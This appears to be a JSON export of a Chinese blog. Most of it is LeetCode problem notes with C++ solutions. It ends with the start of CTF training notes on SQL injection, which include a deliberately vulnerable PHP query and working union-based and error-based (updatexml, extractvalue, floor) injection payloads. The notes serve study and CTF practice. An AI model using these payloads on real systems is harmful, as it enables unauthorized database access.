`root` ，请你将它展开为一个单链表：\n\n- 展开后的单链表应该同样使用 `TreeNode` ，其中 `right` 子指针指向链表中下一个结点，而左子指针始终为 `null` 。\n- 展开后的单链表应该与二叉树 [**先序遍历**](https://baike.baidu.com/item/先序遍历/6442839?fr=aladdin) 顺序相同。\n\n### 思路（两种思路）\n\n#### 思路一\n\n规规矩矩前序遍历，由于要求在原链表上本地操作，前序遍历是先遍历左边，再遍历右边，所以我先把存的值放在左边，最后再统一移到右边\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    TreeNode* ans = new TreeNode(); // 使用括号调用构造函数\n    void pre(TreeNode* root){\n        if(root==NULL){\n            return;\n        }\n        ans->left=root;\n        ans=ans->left;\n        pre(root->left);\n        pre(root->right);\n    }\n    void flatten(TreeNode* root) {\n        if(root==NULL){\n            return;\n        }\n        pre(root);\n        ans=root;\n        while(ans){\n            ans->right=ans->left;\n            ans->left=NULL;\n            ans=ans->right;\n        }\n    }\n};\n```\n\n#### 思路二\n\n反前序遍历，和前面前序遍历相反，先遍历右边，再遍历左边，记录上次遍历的节点\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    TreeNode* preNode;\n    void flatten(TreeNode* root) {\n        if (root == NULL) return;\n        flatten(root->right);\n        flatten(root->left);\n        root->left = NULL;\n        root->right = preNode;\n        preNode = root;\n    }\n};\n```\n\n## 最小覆盖字串（困难）\n\n### 题目描述\n\n给你一个字符串 `s` 、一个字符串 `t` 。返回 `s` 中涵盖 `t` 所有字符的最小子串。如果 `s` 中不存在涵盖 `t` 所有字符的子串，则返回空字符串 `\"\"` 。\n\n### 思路\n\n1. 定义收缩指针i，扩张指针j\n2. 首先j往后扩，直到i和j之内的字符串包含了t中所有字符\n3. i往后缩，获得最小的符合标准的字符串\n4. 记录长度\n5. i再往后缩一格，重复步骤一，将得到的长度和前面得到的长度进行对比，取最小值\n\n重点在于如何判断i和j之内的字符串包含了t中所有字符：我采取的是设置一个哈希表，键是字符，值是字符在t中出现的次数，也就是需要的次数，同时设置needcnt表示还需要几个字符，j每往后移一格，哈希表对应字符就减1，如果增加的字符刚好的需要的字符，needcnt就减一，直到needcnt等于0即代表该段字符串包含所有需要字符，i每往后移一格，哈希表对应字符就加一，同时保证所以字符都不需要，就是都小于0，不等于0是因为保证出现一次，但是尽量不重复\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    string minWindow(string s, string t) {\n        vector<int>ans(2,0);\n        ans[1]=INT_MAX;\n        unordered_map<char,int>hashmap;\n        for(char ch:t){\n            hashmap[ch]++;\n        }\n        int needcnt=t.size();\n        for(int i=0,j=0;i<s.size() && j<s.size();)\n        {\n            while(j<s.size()&&needcnt>0){\n                if(hashmap[s[j]]>0){\n                    needcnt--;\n                }\n                hashmap[s[j]]--;\n                j++;\n            }\n            while(i<s.size()&&hashmap[s[i]]<0){\n                hashmap[s[i]]++;\n                i++;\n            }\n            if(needcnt==0&&j-i<ans[1]-ans[0]){\n                ans[1]=j;\n                ans[0]=i;\n            }\n            hashmap[s[i]]++;\n            needcnt++;\n            i++;\n        }\n        return ans[1]-ans[0]==INT_MAX?\"\":s.substr(ans[0],ans[1]-ans[0]);\n    }\n};\n```\n\n## 滑动窗口最大值（困难）\n\n### 题目描述\n\n给你一个整数数组 `nums`，有一个大小为 `k` 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 `k` 个数字。滑动窗口每次只向右移动一位。\n\n返回 *滑动窗口中的最大值* 。\n\n### 知识点\n\n1. 优先队列：\n\n   + 升序队列，小根堆：`priority_queue <int,vector<int>,greater<int> > p;`\n   + 降序队列，大根堆：`priority_queue <int,vector<int>,less<int> >q;`\n   + 对于基础数据类型，默认是大顶堆：`priority_queue<int> r;`    //等同于 `priority_queue<int, vector<int>, less<int> > r;`\n\n2. pair：\n\n   + pair将两个数据（经常为不同数据类型）组合成一组数据。\n   + pair的实现是一个结构体，主要的两个成员变量是first、second。\n\n3. 优先队列+pair：\n\n   + `priority_queue<pair<int, int> > a;`：\n   + pair的比较规则：先比较第一个元素，第一个相等比较第二个。\n     6 1\n     1 5\n     1 2\n\n4. vector访问最后一个元素：\n\n   ```c++\n   vec.back();\n   ```\n\n   \n\n### 思路（三种思路）\n\n#### 思路一：暴力求解\n\n——会超时\n\n1. 每一轮就更新一次最大值下标的位置\n2. 在新加入的元素比原最大值下标大的情况直接将最大值下标设为新加入元素位置\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    vector<int> maxSlidingWindow(vector<int>& nums, int k) {\n        int length=nums.size();\n        if(length<=k){\n            return {*max_element(nums.begin(),nums.end())};\n        }\n        int maxindex;\n        vector<int> ans(length-k+1);\n        for(int i=0;i+k-1<length;i++){\n            if(i==0||(nums[i+k-1]<nums[maxindex]&&maxindex<i)){\n                maxindex=i+distance(nums.begin()+i,max_element(nums.begin()+i,nums.begin()+i+k));\n            }else{\n                if(nums[i+k-1]>=nums[maxindex]){\n                    maxindex=i+k-1;\n                }\n            }\n            ans[i]=nums[maxindex];\n        }\n        return ans;\n    }\n};\n```\n\n#### 思路二：优先队列+pair\n\n队列里存数据对，正如前面所言，会根据pair的第一个元素排列，接着是第二个，再每次进入新元素的时候，先将新元素插入，然后取队列的最大值，但是这里要先比较队列的最大值的索引是否已经小于了滑动窗口的最小索引，小于了就去除顶元素，用while\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    vector<int> maxSlidingWindow(vector<int>& nums, int k) {\n        int length=nums.size();\n        vector<int> ans(length-k+1);\n        priority_queue<pair<int,int>>maxindex;\n        for(int i=0;i<k;i++){\n            maxindex.emplace(nums[i],i);\n        }\n        ans[0]=maxindex.top().first;\n        for(int i=k;i<length;i++){\n            maxindex.emplace(nums[i],i);\n            while(!maxindex.empty()&&maxindex.top().second<=i-k){\n                maxindex.pop();\n            }\n            ans[i-k+1]=maxindex.top().first;\n        }\n        return ans;\n    }\n};\n```\n\n#### 思路三：思路二的进阶\n\n在插入元素的时候比较一下，如果插入的元素比原队列的某些元素大，原队列的某些元素可以永久剔除掉，那些元素没被删时，插入的元素肯定也没被删，但是如果取最大的元素也不可能是那些比插入元素小的数，这里如果只比较对头则效果不好，因为如果都比队头大了那肯定就是最大的了，队列都可以删了，这种情况很少见，所以要比较队尾，这里就要用双端队列，**这里只存下标**\n\n这种情况下相当于插在队尾，将队尾比自己小的都删了，这样也相当于手工进行排列，(感觉也可以用vector：经实验不行，vector相当于动态数组，不能很好的删除第一个元素，浪费时间和空间)\n\n#### 代码三\n\n```c++\nclass Solution {\npublic:\n    vector<int> maxSlidingWindow(vector<int>& nums, int k) {\n        int length=nums.size();\n        deque<int> maxindex;\n        vector<int>ans(length-k+1);\n        maxindex.push_back(0);\n        for(int i=1;i<k;i++){\n            while(!maxindex.empty()&&nums[i]>=nums[maxindex.back()]){\n                maxindex.pop_back();\n            }\n            maxindex.push_back(i);\n        }\n        ans[0]=nums[maxindex.front()];\n        for(int i=k;i<length;i++){\n            while(!maxindex.empty()&&nums[i]>=nums[maxindex.back()]){\n                maxindex.pop_back();\n            }\n            maxindex.push_back(i);\n            while(maxindex.front()<=i-k){\n                maxindex.pop_front();\n            }\n            ans[i-k+1]=nums[maxindex.front()];\n        }\n        return ans;\n    }\n};\n```\n\n## 最小栈（中等）\n\n### 题目描述\n\n设计一个支持 `push` ，`pop` ，`top` 操作，并能在常数时间内检索到最小元素的栈。\n\n实现 `MinStack` 类:\n\n- `MinStack()` 初始化堆栈对象。\n- `void push(int val)` 将元素val推入堆栈。\n- `void pop()` 删除堆栈顶部的元素。\n- `int top()` 获取堆栈顶部的元素。\n- `int getMin()` 获取堆栈中的最小元素。\n\n### 知识点\n\n1. 栈的定义及基本使用：\n\n   ```c++\n   stack<int> stk;\n   s.empty()               如果栈为空返回true，否则返回false\n   s.size()                返回栈中元素的个数\n   s.pop()                 删除栈顶元素但不返回其值\n   s.top()                 返回栈顶的元素，但不删除该元素\n   s.push()                在栈顶压入新元素\n   ```\n\n   \n\n### 思路(两种思路)\n\n#### 思路一：栈+队列\n\n用队列来存储当前的最小值，大概思路如下：先加入第一个元素，接着对每个加进来的元素进行判断，如果加进来的元素比队列第一个元素大，那么最小值就不可能返回这个值，就不将其加在队列中，如果比第一个元素小就加在队列中，这样队列的第一个元素一定是最小值，接着如果要对栈顶部元素进行删除，如果栈顶部元素为队列第一个元素，则队列也删除第一个元素就行了，返回最小值永远是队列的第一个元素\n\n#### 代码一\n\n```c++\nclass MinStack {\npublic:\n    stack<int> num;\n    deque<int> minnum;\n    MinStack() {\n    }\n    void push(int val) {\n        num.push(val);\n        if(minnum.empty()||val<=minnum.front())minnum.push_front(val);\n    }\n    void pop() {\n        int topnum=num.top();\n        num.pop();\n        if(topnum==minnum.front())minnum.pop_front();\n        \n    }\n    int top() {\n        return num.top();\n    }\n    int getMin() {\n        return minnum.front();\n    }\n};\n```\n\n#### 思路二：栈\n\n栈里面既存元素又存加入该元素后的最小值，只需要在加入元素的时候比较一下，如果加入的元素比上一个元素最小值小就更新\n\n#### 代码二\n\n```c++\nclass MinStack {\npublic:\n    stack<pair<int, int>> st;\n    MinStack() {\n    }\n    \n    void push(int x) {\n        if (st.size() == 0) {\n            st.push({x, x});\n        } else {\n            st.push({x, min(x, st.top().second)});\n        }\n    }\n    void pop() {\n        st.pop();\n    }\n    int top() {\n        return st.top().first;\n    }\n    int getMin() {\n        return st.top().second;\n    }\n};\n\n```\n\n## 最大子数组和（中等）\n\n### 题目描述\n\n给你一个整数数组 `nums` ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。\n\n**子数组** 是数组中的一个连续部分。\n\n### 思路\n\n动态规划：遍历数组，记录到该值时右侧的最大连续数和，就是到前一个数最大连续数和加上该值，如果比该值更大，就记录该和是到该值的最大连续数和，用一个值存所有连续数和的最大值\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int maxSubArray(vector<int>& nums) {\n        int maxbypreindex=nums[0];\n        int maxnum=maxbypreindex;\n        int length=nums.size();\n        for(int i=1;i<length;i++){\n            maxbypreindex=max(maxbypreindex+nums[i],nums[i]);\n            maxnum=max(maxbypreindex,maxnum);\n        }\n        return maxnum;\n    }\n};\n```\n\n## 下一个排列（中等）\n\n### 题目描述\n\n整数数组的一个 **排列** 就是将其所有成员以序列或线性顺序排列。\n\n- 例如，`arr = [1,2,3]` ，以下这些都可以视作 `arr` 的排列：`[1,2,3]`、`[1,3,2]`、`[3,1,2]`、`[2,3,1]` 。\n\n整数数组的 **下一个排列** 是指其整数的下一个字典序更大的排列。更正式地，如果数组的所有排列根据其字典顺序从小到大排列在一个容器中，那么数组的 **下一个排列** 就是在这个有序容器中排在它后面的那个排列。如果不存在下一个更大的排列，那么这个数组必须重排为字典序最小的排列（即，其元素按升序排列）。\n\n- 例如，`arr = [1,2,3]` 的下一个排列是 `[1,3,2]` 。\n- 类似地，`arr = [2,3,1]` 的下一个排列是 `[3,1,2]` 。\n- 而 `arr = [3,2,1]` 的下一个排列是 `[1,2,3]` ，因为 `[3,2,1]` 不存在一个字典序更大的排列。\n\n给你一个整数数组 `nums` ，找出 `nums` 的下一个排列。\n\n必须**[ 原地 ](https://baike.baidu.com/item/原地算法)**修改，只允许使用额外常数空间。\n\n### 知识点\n\n1. 反转数组\n\n   ```c++\n   vector<int> reverseArray(vector<int> a)\n   {\n       reverse(a.begin(),a.end());\n       return a;\n   }\n   ```\n\n### 思路\n\n1. 用两个下标i,j，i从length-1开始往前，j从i前一个开始往前\n2. 记录nums[i]>nums[j]最大的j和i\n3. 交换两者数字，对后面数字进行排列，即得到结果\n4. 由于i就是从最大到最小不用管，找最大的j即可\n5. <img src=\"2023-8-7%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/8c19582d7184ff38afbe6f0a5d06843.jpg\" alt=\"8c19582d7184ff38afbe6f0a5d06843\" style=\"zoom:50%;\" />\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    void nextPermutation(vector<int>& nums) {\n        vector<int>ans(2,-1);\n        int length=nums.size();\n        for(int i=length-1;i>=1;i--){\n            for(int j=i-1;j>=0;j--){\n                if(j<ans[0]||nums[j]<nums[i]){\n                    if(j>ans[0]){\n                        ans[0]=j;\n                        ans[1]=i;\n                    }\n                    break;\n                }              \n            }\n        }\n        if(ans[0]==-1){\n            reverse(nums.begin(),nums.end());\n        }else{\n            swap(nums[ans[0]],nums[ans[1]]);\n            sort(nums.begin()+ans[0]+1,nums.end());\n        }\n        return;\n    }\n};\n```\n\n## 字符串解码(中等)\n\n### 题目描述\n\n给定一个经过编码的字符串，返回它解码后的字符串。\n\n编码规则为: `k[encoded_string]`，表示其中方括号内部的 `encoded_string` 正好重复 `k` 次。注意 `k` 保证为正整数。\n\n你可以认为输入字符串总是有效的；输入字符串中没有额外的空格，且输入的方括号总是符合格式要求的。\n\n此外，你可以认为原始数据不包含数字，所有的数字只表示重复的次数 `k` ，例如不会出现像 `3a` 或 `2[4]` 的输入。\n\n### 知识点\n\n1. 字符串拼接\n\n   ```c++\n   string s1 = \"alan\";\n   string s2 = \"xiho\";\n   string s3 = s1 + s2;\n   ```\n\n2. 字符串复制:\n   假设str1和str2是两个字符串对象，len是子字符串的长度。我们要将字符串str1复制到字符串对象str2中，则语法应类似于:\n\n   ```c++\n   str1.copy(str2,len);\n   str1.copy(str2,len,pos);\n   ```\n\n   str2: str2是保留复制的字符串的目标字符串对象。\n   len: 定义子字符串的长度。\n   pos: 确定要包含的第一个字符的位置。\n\n### 思路\n\n整体还是比较简单，不知道为什么第一次没做出来哈哈哈，过了几天反而又做出来了~\n\n用递归的思路，可以发现对字符串解码过程其实就是一个不断重复地过程，因为对一个字符串解码和对其子字符串解码的步骤都是一样的，用递归就很好的避免了重复步骤\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    string decodeString(string s) {\n        string ans;\n        int length=s.size();\n        int n;\n        string tempans;\n        int judge=0;\n        string numStr;\n        for(int i=0;i<length;i++){\n            while(i<length&&((int(s[i])-48>9)||(int(s[i])-48<0)))ans.push_back(s[i++]);\n            if((int(s[i])-48<=9)&&(int(s[i])-48>=0)){\n                numStr.clear();\n                numStr.push_back(s[i]);\n                while((int(s[i+1])-48<=9)&&(int(s[i+1])-48>=0))numStr.push_back(s[++i]);\n                n=stoi(numStr);\n                judge=1;\n                i+=2;\n                tempans.clear();\n                while(i<length&&judge!=0){\n                    if(s[i]=='[')judge++;\n                    if(s[i]==']')judge--;\n                    if(judge!=0){\n                        tempans.push_back(s[i]);\n                        i++;\n                    }\n                }\n                tempans=decodeString(tempans);\n                while(n--)ans+=tempans;\n            }\n        }\n        return ans;\n    }\n};\n```\n\n\n\n## 最长公共子序列（中等）\n\n### 题目描述\n\n给定两个字符串 `text1` 和 `text2`，返回这两个字符串的最长 **公共子序列** 的长度。如果不存在 **公共子序列** ，返回 `0` 。\n\n一个字符串的 **子序列** 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。\n\n- 例如，`\"ace\"` 是 `\"abcde\"` 的子序列，但 `\"aec\"` 不是 `\"abcde\"` 的子序列。\n\n两个字符串的 **公共子序列** 是这两个字符串所共同拥有的子序列。\n\n### 知识点\n\n1. 二维vector初始化空间(r行c列)\n\n   ```c++\n    vector<vector<int> > newOne(r, vector<int>(c, 0));\n   ```\n\n### 思路\n\n二位动态规划，`dp[i][j]`代表text1前i个和text2前j个的最长公共子序列，首先确认前0个和另一个字符串最长公共子序列都是零，状态转换：\n\n```python\nif text1[i]==text2[j]:\n\tdp[i+1][j+1]=dp[i][j]+1\nelse:\n\tdp[i+1][j+1]=max(dp[i+1][j],dp[i][j+1]);\n```\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int longestCommonSubsequence(string text1, string text2) {\n        int length1=text1.size();\n        int length2=text2.size();\n        int maxAns=0;\n        vector<vector<int>>dp(length1+1,vector<int>(length2+1,0));\n        for(int i=0;i<length1;i++){\n            for(int j=0;j<length2;j++){\n                if(text1[i]==text2[j]){\n                    dp[i+1][j+1]=dp[i][j]+1;\n                }else{\n                    dp[i+1][j+1]=max(dp[i+1][j],dp[i][j+1]);\n                }\n                maxAns=max(dp[i+1][j+1],maxAns);\n            }\n        }\n        return maxAns;\n    }\n};\n```\n\n## 盛最多水的容器(中等)\n\n### 题目描述\n\n给定一个长度为 `n` 的整数数组 `height` 。有 `n` 条垂线，第 `i` 条线的两个端点是 `(i, 0)` 和 `(i, height[i])` 。\n\n找出其中的两条线，使得它们与 `x` 轴共同构成的容器可以容纳最多的水。\n\n返回容器可以储存的最大水量。\n\n**说明：**你不能倾斜容器。\n\n### 思路\n\n不知道大家对有一道leetcode题还有没有印象，也是盛水，不过是算所有缝隙的水，感觉有异曲同工之妙\n\n思路很简单，就是双指针，如果left指向的高度小于right，left就往这边移，这才可能会遇到会有最大面积的容器，因为事实上我们将left往右移，只是**遗弃了原left和原left+1这一块的体积**，但是本来left指向的高度就小于right，left和left+1组成块的面积肯定小于或者等于left和right\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int maxArea(vector<int>& height) {\n        int left=0;\n        int right=height.size()-1;\n        int maxArea=0;\n        while(left!=right){\n            maxArea=max(maxArea,(right-left)*min(height[right],height[left]));\n            if(height[left]>height[right]){\n                right--;\n            }else{\n                left++;\n            }\n        }\n        return maxArea;\n    }\n};\n```\n\n## 实现Trie（前缀树）（中等）\n\n### 题目描述\n\n**[Trie](https://baike.baidu.com/item/字典树/9825209?fr=aladdin)**（发音类似 \"try\"）或者说 **前缀树** 是一种树形数据结构，用于高效地存储和检索字符串数据集中的键。这一数据结构有相当多的应用情景，例如自动补完和拼写检查。\n\n请你实现 Trie 类：\n\n- `Trie()` 初始化前缀树对象。\n- `void insert(String word)` 向前缀树中插入字符串 `word` 。\n- `boolean search(String word)` 如果字符串 `word` 在前缀树中，返回 `true`（即，在检索之前已经插入）；否则，返回 `false` 。\n- `boolean startsWith(String prefix)` 如果之前已经插入的字符串 `word` 的前缀之一为 `prefix` ，返回 `true` ；否则，返回 `false` 。\n\n### 思路\n\n使用链表+哈希，因为哈希查找元素的复杂度为1，以单词前缀作为哈希索引,ifis代表该节点是否真实有值\n\n### 代码\n\n```c++\nclass Trie {\npublic:\n    struct ListNode{\n        char val;\n        int ifIS;\n        unordered_map<char,struct ListNode*>next;\n    };\n    ListNode*head=new ListNode();\n    Trie() {\n    }\n    \n    void insert(string word) {\n        ListNode*copy=head;\n        for(char ww:word){\n            if(copy->next.find(ww)!=copy->next.end()){\n                copy=copy->next[ww];\n            }else{\n                ListNode*newnode=new ListNode();\n                newnode->val=ww;\n                newnode->ifIS=0;\n                copy->next[ww]=newnode;\n                copy=newnode;\n            }\n        }\n        copy->ifIS=1;\n    }\n    \n    bool search(string word) {\n        ListNode*copy=head;\n        for(char ww:word){\n            if(copy->next.find(ww)!=copy->next.end()){\n                copy=copy->next[ww];\n            }else{\n                return false;\n            }\n        }\n        if(copy->ifIS==1){\n            return true;\n        }else{\n            return false;\n        }\n        // return true;\n    }\n    \n    bool startsWith(string prefix) {\n        ListNode*copy=head;\n        for(char ww:prefix){\n            if(copy->next.find(ww)!=copy->next.end()){\n                copy=copy->next[ww];\n            }else{\n                return false;\n            }\n        }\n        return true;\n    }\n};\n\n```\n\n## 杨辉三角（简单）\n\n### 题目描述\n\n给定一个非负整数 *`numRows`，*生成「杨辉三角」的前 *`numRows`* 行。\n\n在「杨辉三角」中，每个数是它左上方和右上方的数的和。\n\n### 思路\n\n用ans1算下一行\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<vector<int>> generate(int numRows) {\n        vector<vector<int>>ans;\n        vector<int>ans1;\n        ans.push_back({1});\n        for(int i=1;i<numRows;i++){\n            ans1.push_back(1);\n            for(int j=0;j<ans.back().size()-1;j++){\n                ans1.push_back(ans.back()[j]+ans.back()[j+1]);\n            }\n            ans1.push_back(1);\n            ans.push_back(ans1);\n            ans1.clear();\n        }\n        return ans;\n    }\n};\n```\n\n## 打家劫舍（中等）\n\n### 题目描述\n\n你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，**如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警**。\n\n给定一个代表每个房屋存放金额的非负整数数组，计算你 **不触动警报装置的情况下** ，一夜之内能够偷窃到的最高金额。\n\n### 思路\n\n很简单的动态规划，dp[i]=dp[i]+max[dp[i-2],dp[i-3]……]\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int rob(vector<int>& nums) {\n        int maxmoney=0;\n        for(int i=0;i<nums.size();i++){\n            if(i>=2){\n                nums[i]+=*max_element(nums.begin(),nums.begin()+i-1);\n            }\n            maxmoney=max(nums[i],maxmoney);\n        }\n        return maxmoney;\n    }\n};\n```\n\n## 旋转图像(中等)\n\n### 题目描述\n\n给定一个 *n* × *n* 的二维矩阵 `matrix` 表示一个图像。请你将图像顺时针旋转 90 度。\n\n你必须在**[ 原地](https://baike.baidu.com/item/原地算法)** 旋转图像，这意味着你需要直接修改输入的二维矩阵。**请不要** 使用另一个矩阵来旋转图像。\n\n### 思路\n\n找到旋转的规律，其实坐标总体变化是固定的\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    void rotate(vector<vector<int>>& matrix) {\n        int length=matrix.size();\n        int temp1;\n        for(int i=0;i<length/2;i++){\n            for(int j=i;j<length-i-1;j++){\n                temp1=matrix[i][j];\n                matrix[i][j]=matrix[length-1-j][i];\n                matrix[length-1-j][i]=matrix[length-1-i][length-1-j];\n                matrix[length-1-i][length-1-j]=matrix[j][length-1-i];\n                matrix[j][length-1-i]=temp1;\n            }\n        }\n    }\n};\n```\n\n## 和为k的子数组（中等）\n\n### 题目描述\n\n给你一个整数数组 `nums` 和一个整数 `k` ，请你统计并返回 *该数组中和为 `k` 的连续子数组的个数* 。\n\n### 思路\n\n暴力解法会超时，只介绍前缀加哈希\n\n首先考虑用一个二维数组保存前i+1个数的和，比如sum[1]表示下标0和下标1的和，sum[100]表示下标0-100的和，接下来遍历数组，比如我们要找下标结尾为j的连续子数组和为k，我们知道sum[j]是多少，只需要找到一个i使得sum[j]-sum[i]为k即可，即sum[i]=sum[j]-k。\n\n优化：哈希找key的复杂度为1，所以考虑用哈希，哈希的键是前缀和，也就是sum，值是前缀和出现的次数，也就是可能前i个数和前j个数的和都是一样的值，这种算连续数组的时候也要算两次，所以需要记录。我们遍历数组的时候是以遍历的下标作为结尾，只考虑该坐标和该坐标前的sum，那么就暂时不需要考虑后面的sum，所以sum的计算和遍历可以同时进行\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int subarraySum(vector<int>& nums, int k) {\n        unordered_map<int,int>preSumMap;\n        preSumMap[0]=1;\n        int count=0;\n        int pre=0;\n        for(int number:nums){\n            pre+=number;\n            auto it=preSumMap.find(pre-k);\n            if(it!=preSumMap.end()){\n                count+=it->second;\n            }\n            preSumMap[pre]++;\n        }\n        return count;\n    }\n};\n```\n\n## 二叉搜索树中第K小的元素(中等)\n\n### 题目描述\n\n给定一个二叉搜索树的根节点 `root` ，和一个整数 `k` ，请你设计一个算法查找其中第 `k` 个最小元素（从 1 开始计数）。\n\n### 思路\n\n#### 思路一：优先队列暴力求解\n\n用dfs遍历二叉树，存在优先队列中，再取第k个最小的数\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    priority_queue <int,vector<int>,greater<int> > p;\n    void dfs(TreeNode* root){\n        if(root==NULL){\n            return;\n        }else{\n            p.emplace(root->val);\n            dfs(root->left);\n            dfs(root->right);\n        }\n    }\n    int kthSmallest(TreeNode* root, int k) {\n        dfs(root);\n        while(--k){\n            p.pop();\n        }\n        return p.top();\n    }\n};\n```\n\n#### 思路二：利用二叉搜索树的性质\n\n二叉搜索树中序遍历即升序排列，利用该性质可方便求解\n\n#### 代码二：\n\n```c++\nclass Solution {\npublic:\n    int km;\n    int ans;\n    void dfs(TreeNode* root){\n        if(root==NULL||km==0){\n            return;\n        }\n        dfs(root->left);\n        if(--km==0){\n            ans=root->val;\n            return;\n        }\n        dfs(root->right);\n    }\n    int kthSmallest(TreeNode* root, int k) {\n        km=k;\n        dfs(root);\n        return ans;\n    }\n};\n```\n\n## 搜索插入位置（简单）\n\n### 题目描述\n\n给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。\n\n请必须使用时间复杂度为 `O(log n)` 的算法。\n\n### 思路\n\n很明显使用二分查找\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int searchInsert(vector<int>& nums, int target) {\n        int mid=0;\n        int right=nums.size()-1;\n        int left=0;\n        while(left<right){\n            mid=(right+left)/2;\n            if(nums[mid]>=target){\n                right=mid;\n            }else{\n                left=mid+1;\n            }\n        }\n        if(nums[left]<target){\n            return left+1;\n        }\n        return left;\n    }\n};\n```\n\n## 划分字母区间（中等）(待做)\n\n### 题目描述\n\n给你一个字符串 `s` 。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。\n\n注意，划分结果需要满足：将所有划分结果按顺序连接，得到的字符串仍然是 `s` 。\n\n返回一个表示每个字符串片段的长度的列表。\n\n \n\n**示例 1：**\n\n```\n输入：s = \"ababcbacadefegdehijhklij\"\n输出：[9,7,8]\n解释：\n划分结果为 \"ababcbaca\"、\"defegde\"、\"hijhklij\" 。\n每个字母最多出现在一个片段中。\n像 \"ababcbacadefegde\", \"hijhklij\" 这样的划分是错误的，因为划分的片段数较少。 \n```\n\n### 知识点\n\n1. 哈希倒序遍历：\n\n   ```c++\n   for (auto it = hashMap.rbegin(); it != hashMap.rend(); ++it) {}\n   ```\n\n","tags":["c","c++"],"categories":["数据结构"]},{"title":"ctf特训营笔记","url":"/post/392e8386.html","content":"\n## 第一篇 CTF之Web\n\n### 第一章 常用工具安装及使用\n\n本章节就不记录了，主要有sqlmap burpsuite nmap 浏览器插件\n\n<!--more-->\n\n## 第二章 SQL注入攻击\n\n#### 什么是sql注入\n\n##### sql注入分类\n\n+ 可回显的注入\n  + 联合查询\n  + 报错注入\n  + 通过注入进行DNS请求\n+ 不可回显的注入\n  + Bool盲注\n  + 时间盲注\n+ 二次注入（需要配合脚本）\n\n注意：通常出题人会增加一层WAF（比如：对关键字进行过滤）\n\n#### 可以联合查询的sql注入\n\n看到了测试样例代码时需要关闭GPC，但是lz不知道GPC是什么，简单查了一下：\n\nGPC是php.ini中的magic_quotes_gpc，默认为off，如何打开了，会实现addslashes()和stripslashes()的功能，对于从GET，POST，COOKIE输入的单引号、双引号、反斜线和NULL会加反斜线进行转义\n\neg：\n\n代码：\n\n```php\n<?php\n\t$id=$_GET['id'];\n\t$getid=\"select id from users where user_id='$id'\";\n\t$result=mysql_query($getid) or die('<pre>'.mysql_error().'</pre>');\n\t$num=mysql_numrows($result)\n?>\n```\n\n如果此时传参?id=-1'union+select+1+--+\n\n拼接后就变成select id from users where user_id='-1' union select 1 -- '\n\n--后面的'会被注释掉\n\n#### 报错注入\n\n##### updatexml\n\n对于会返回报错信息的界面，该方法实用\n\n还是上面的例子：传参?id=1'+updatexml(1,concat(0x7e,(select version()),0x7e),1)%23\n\n注入原理：\n\nupdatexml是SQL语法的一个函数：```UPDATEXML(XML_document, XPath_string, new_value)```\n\n参数：\n\n1： `XML_document`是String格式，为XML文档对象的名称，文中为Doc\n\n2：`XPath_string` (Xpath格式的字符串) ，用于匹配第一个参数中的部分内容。（就像使用正则表达式匹配一个文本的特定内容一样）\n\n3： `new_value`，String格式，替换查找到的符合条件的数据。\n\n在这里，我们利用updatexml函数的报错机制进行注入，原理就是当第二个参数的格式和Xpath的格式不符的时候，就会产生报错，我们可以将我们的payload构造到第二个参数中，让其随着报错信息展示到页面上。\n\n##### extractvalue\n\n`extractvalue(xml_frag, xpath_expr)`：从一个使用xpath语法的xml字符串中提取一个值。\n\n`xml_frag`：xml文档对象的名称，是一个string类型。\n\n`xpath_expr`：使用xpath语法格式的路径。\n\nSQL报错注入的应用：当使用extractvalue(xml_frag, xpath_expr)函数时，若xpath_expr参数不符合xpath格式，就会报错。\n\n而`~`符号(ascii编码值：0x7e)是不存在xpath格式中的， 所以一旦在xpath_expr参数中使用`~`符号，就会产生xpath syntax error (xpath语法错误)，通过使用这个方法就可以达到报错注入的目的。\n\n```javascript\nand extractvalue(1, (concat(0x7e,(payload)))) #\nor  extractvalue(1,concat(0x3a,(select database()),0x3a)) #\n```\n\n##### floor\n\n参考链接：[Floor报错注入原理解析心得_floor注入-CSDN博客](https://blog.csdn.net/qq_27130557/article/details/120902212)\n\ngroup by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次，但是由于是直接插入，所以可能最开始查找是否有该主键的时候确实没有，但是rand()之后可能产生一个存在的值，但是再次计算之后是直接插入，就有可能出现报错：主键重复，我们可以将我们想要的内容放在group by里，这样返回报错信息的时候会返回\n\n###### 爆破数据库版本：\n\n```sqlite\n1' and(select 1 from (select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)%23\n```\n\n使用`concat`函数将数据库版本信息（`version()`）连接到`0x7e`（波浪号）两边\n\n(select (select concat(0x7e,version(),0x7e)))：\n\n1. 外层 `SELECT` 子查询：`(select ...)`，这是外层的子查询，它是整个注入语句的一部分。外层子查询的作用是将内层子查询的结果作为一个单独的列返回。\n2. 内层 `SELECT` 子查询：`(select 